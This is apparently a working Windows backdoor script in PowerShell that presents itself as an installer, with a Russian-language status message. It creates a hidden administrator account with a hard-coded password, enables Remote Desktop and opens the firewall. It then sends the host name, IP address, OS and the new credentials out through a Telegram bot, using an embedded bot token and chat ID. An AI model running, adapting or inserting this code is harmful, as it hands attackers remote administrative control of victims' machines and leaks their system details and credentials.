# ===== UTF-8 FIX =====
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# ===== SAFETY =====
if ($env:ALLOW_MINING -ne "1") { exit }

# ===== TELEGRAM =====
$TG_TOKEN = "8556429231:AAFBKuMMfkrpnxJInSITVaBUD8prYuHcnLw"
$TG_CHAT  = "5336452267"

function Send-TG($text) {
    Invoke-RestMethod `
        -Uri "https://api.telegram.org/bot$TG_TOKEN/sendMessage" `
        -Method POST `
        -Body @{
            chat_id = $TG_CHAT
            text    = $text
        } `
        -ErrorAction SilentlyContinue
}

# ===== PATH =====
$BASE = "$env:APPDATA\.installer"
New-Item -ItemType Directory -Force -Path $BASE | Out-Null

# ===== ONE-TIME MARKER =====
$marker = "$BASE\installed.flag"
if (Test-Path $marker) { exit }

# ===== CREATE USER =====
$user = "rdpuser"
$pass = "P@ssw0rd123!"
$sec  = ConvertTo-SecureString $pass -AsPlainText -Force

try {
    New-LocalUser -Name $user -Password $sec -PasswordNeverExpires -UserMayNotChangePassword
} catch {}

Add-LocalGroupMember -Group "Remote Desktop Users" -Member $user -ErrorAction SilentlyContinue
Add-LocalGroupMember -Group "Administrators" -Member $user -ErrorAction SilentlyContinue

# ===== ENABLE RDP =====
Set-ItemProperty `
  -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
  -Name fDenyTSConnections `
  -Value 0

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# ===== SYSTEM INFO =====
$host = $env:COMPUTERNAME
$who  = $env:USERNAME
$os   = (Get-CimInstance Win32_OperatingSystem).Caption
$ip   = (Get-NetIPAddress -AddressFamily IPv4 `
        | Where-Object {$_.IPAddress -notlike "169.*"} `
        | Select-Object -First 1).IPAddress

# ===== TELEGRAM MESSAGE (UTF-8 OK) =====
Send-TG @"
🪟 Windows агент установлен

Host: $host
IP: $ip
User created: $user
Password: $pass
OS: $os
Installed by: $who
Time: $(Get-Date)
"@

# ===== MARK DONE =====
New-Item -ItemType File -Path $marker | Out-Null
